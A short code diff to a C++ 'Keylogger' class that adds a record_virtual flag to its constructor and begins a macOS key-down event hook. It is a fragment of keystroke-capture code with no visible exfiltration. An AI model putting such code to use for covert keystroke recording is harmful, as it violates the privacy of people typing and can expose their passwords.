@@ -6,7 +6,7 @@
 
 #include "recorder.hpp"
 
-Keylogger::Keylogger(const std::string& out_path) : recorder_(out_path) {}
+Keylogger::Keylogger(const std::string& out_path, bool record_virtual) : recorder_(out_path, record_virtual) {}
 
 void Keylogger::Run() {
   CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
